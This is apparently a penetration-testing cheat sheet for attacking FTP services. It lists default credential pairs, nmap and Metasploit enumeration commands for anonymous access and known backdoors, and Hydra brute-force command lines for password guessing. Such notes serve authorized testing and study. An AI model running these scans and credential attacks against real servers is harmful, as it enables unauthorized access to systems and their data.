# FTP
- File Transfer Protocol

##### Default Credentials
```
anonymous:anonymous
administrator:administrator
admin:admin
```


---
---


## Enumeration

##### Banner Grabbing
- netcat
```
nc -vn [IP] 21
```

- telnet
```
telnet [IP]
```

- nmap
```
nmap -sC -sV -p21 [IP]
```

##### Nmap Scanning
- Script Enumeration
```
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```

- Vulnerability Scanning with all ftp scripts
```
nmap --script=ftp-* -p 21 [IP]
```

- FTP Anonymous Enumeration
```
nmap -p 21 --script ftp-anon [IP]
```

##### Metasploit
```
use auxiliary/scanner/ftp/anonymous
set rhosts [Target IP]
run
```


---
---


## Exploitation

##### Anonymous Login
- When prompted for a password, use anonymous or try something random.
```sh
ftp anonymous@[IP]
```

### Hydra
- Use -V to print each login attempt
#### User List and Password List, Port Flexible
```sh
hydra -t 1 -L [Username_List] -P [Password_list] -vV ftp://[IP]:[PORT]
```
##### Use a file with User:Pass combo for login
```sh
hydra -t 1 -C [user:pass File] -vV [IP] ftp
```
##### Use a file with User:Pass combo (Used for Known User/Pass combo)
```sh
hydra -s [Port] -C [user:pass File] -u -f [IP] ftp
```
##### No Parallel Scanning (One Attempt at a Time)
```sh
hydra -l [Specific_Username] -P [Wordlist] -t 1 [IP] ftp
```
##### Exit Scan After Valid Logon Found
```sh
hydra -l [Specific_Username] -P [Wordlist] -f [IP] ftp
```